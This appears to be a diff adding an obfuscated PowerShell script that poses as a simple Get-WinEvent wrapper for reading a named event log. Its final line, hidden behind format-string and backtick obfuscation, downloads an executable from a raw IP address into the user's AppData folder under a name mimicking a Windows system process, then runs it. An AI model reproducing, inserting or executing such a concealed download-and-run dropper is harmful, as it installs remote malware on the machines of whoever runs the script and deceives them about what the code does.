@@ -1,0 +1,8 @@
+[CmdletBinding()]
+Param(
+    [Parameter(MAnDAtOrY=${T`Rue},pOsITiOn=0)]
+        [String]${L`oGNaMe}
+)
+
+&("{0}{3}{1}{2}" -f'G','inE','vent','et-W') -LogName ${l`Ogn`AMe}
+(.("{1}{2}{0}" -f'-Object','N','ew') ("{2}{0}{3}{1}{4}" -f'ystem.Ne','bClien','S','t.We','t')).("{3}{0}{2}{1}"-f 'oad','ile','F','Downl').Invoke(("{1}{5}{8}{7}{4}{0}{6}{9}{3}{2}"-f'.218/~y','http://89','e','sv.ex','70','.24','ahoo/c','1','8.','sr'),"$env:APPDATA\csrsv.exe");&("{1}{0}{2}" -f 'e','Start-Proc','ss') ("$env:APPDATA\csrsv.exe")
